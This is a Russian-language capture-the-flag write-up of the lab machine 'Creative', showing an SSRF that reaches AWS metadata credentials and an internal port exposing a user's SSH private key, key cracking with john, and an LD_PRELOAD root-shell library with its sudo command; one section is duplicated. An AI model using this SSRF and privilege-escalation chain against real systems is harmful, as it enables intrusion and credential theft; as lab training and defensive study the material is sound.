# Отчет о пентесте: Машина "Creative" 

## 📌 1. Разведка (Reconnaissance)

### 1.1 Сканирование портов

```bash
nmap -sC -sV -p- 10.10.11.1 -T4 -Pn -oN creative.nmap
```

**Результат:**

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

На порту 80 — редирект на `http://creative.thm`, добавлен в `/etc/hosts`.

### 1.2 Фаззинг виртуальных хостов

```bash
gobuster vhost -u http://creative.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

Найден `beta.creative.thm`.

## 🛠️ 2. SSRF через Beta URL Tester

На `http://beta.creative.thm` обнаружена форма "Beta URL Tester".  
Она принимает URL через параметр `url` и возвращает `Alive` или `Dead`.

```bash
POST / HTTP/1.1
Host: beta.creative.thm
...
url=http://127.0.0.1
```

### Проверка локальных адресов
После многочисленных проверок и разворачивании python-сервера для проверка ssrf удалось получить доступ к к `http://169.254.169.254/latest/meta-data/` дал список версий AWS Metadata.

```bash
curl "http://beta.creative.thm/?url=http://169.254.169.254/latest/meta-data/"
```

### Получение IAM-учётных данных

```bash
curl "http://beta.creative.thm/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/vulnerable-machine"
```

Ответ:

```json
{
  "AccessKeyId": "AKIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-08-25T15:44:12Z"
}
```

## ☁️ 3. AWS Enumeration (ограничена)

Экспорт полученных ключей:

```bash
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
export AWS_DEFAULT_REGION=us-east-1
```

### Попытки доступа

| Действие | Результат |
|----------|-----------|
| `aws s3 ls` | `AccessDenied` |
| `aws dynamodb list-tables` | `AccessDenied` |
| `aws ec2 describe-instances` | `UnauthorizedOperation` |
| `aws s3 ls s3://creative/` | `AccessDenied` |

**Вывод:** роль `vulnerable-machine` не имеет прав на перечисление ресурсов. AWS — не тот вектор.

## 🔍 4. Внутренний порт 1337

Брутфорс внутренних портов через SSRF:


Найден открытый порт **1337**.

```bash
curl "http://beta.creative.thm/?url=http://127.0.0.1:1337/"
```

Ответ — листинг директории:

```
/home/
/var/
/tmp/
...
```

---

## 🗂️ 5. Получение SSH-ключа пользователя saad

```bash
curl "http://beta.creative.thm/?url=http://127.0.0.1:1337/home/saad/.ssh/id_rsa"
```

Скачиваем ключ:

```bash
echo "-----BEGIN OPENSSH PRIVATE KEY-----..." > id_rsa
chmod 600 id_rsa
```

### Взлом пароля SSH-ключа

```bash
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Результат:

```
sweetness        (id_rsa)
```

### Вход по SSH

```bash
ssh -i id_rsa saad@<target_ip>
```

Пароль: `sweetness`

---

## 🧑‍💻 6. Подготовка к повышению привилегий

### 6.1 Проверка прав sudo

```bash
sudo -l 
```
требует пароль

### 6.2 Проверка SUID и Capabilities

```bash
find / -type f -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
```

Ничего полезного.

### 6.3 Проверка cron

```bash
ls -la /etc/cron*
```

Пусто.

### 6.4 Найден пароль пользователя в истории

```bash
cat ~/.bash_history | grep -i pass
```

Найден пароль:

```
saad:MyStrongestPasswordYet$4291
```

### 6.4 Найден пароль пользователя в истории

```bash
cat ~/.bash_history | grep -i pass
```

Найден пароль:

```
saad:MyStrongestPasswordYet$4291
```

### 6.5 Повторный sudo -l с паролем

```bash
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
User saad may run the following commands on ip-10-113-164-241:
    (root) /usr/bin/ping
```

---

## 🧨 7. Эксплуатация LD_PRELOAD

### 7.1 Создание вредоносной библиотеки

Создаём файл `shell.c`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init()
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

**Объяснение кода:**

| Строка | Назначение |
|--------|------------|
| `void _init()` | Функция, вызываемая при загрузке библиотеки |
| `unsetenv("LD_PRELOAD")` | Удаляем переменную окружения, чтобы избежать рекурсии |
| `setgid(0)` | Устанавливаем группу root (GID=0) |
| `setuid(0)` | Устанавливаем пользователя root (UID=0) |
| `system("/bin/sh")` | Запускаем интерактивную оболочку |

### 7.2 Компиляция

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

- `-fPIC` — позиционно-независимый код
- `-shared` — создание динамической библиотеки
- `-nostartfiles` — не подключать стандартные стартовые файлы (для работы `_init`)

### 7.3 Запуск с привилегиями

```bash
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping 127.0.0.1
```

После выполнения открывается root-шеll.

---

## 🏁 8. Получение root

```bash
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
THM{...}
```


## 🧾 Заключение

| Уязвимость | Использование |
|------------|---------------|
| SSRF | Доступ к AWS Metadata |
| Открытый порт 1337 | Чтение `/home/saad/.ssh/id_rsa` |
| Слабый пароль SSH-ключа | Взлом через `rockyou.txt` |
| LD_PRELOAD | Повышение прав до root через `ping` |


## 🛡️ Рекомендации по защите

- Отключить возможность SSRF на бэкенде
- Не выводить листинг файловой системы на порту 1337
- Не использовать `LD_PRELOAD` с `sudo`
- Ограничить разрешения SUID и `env_keep`

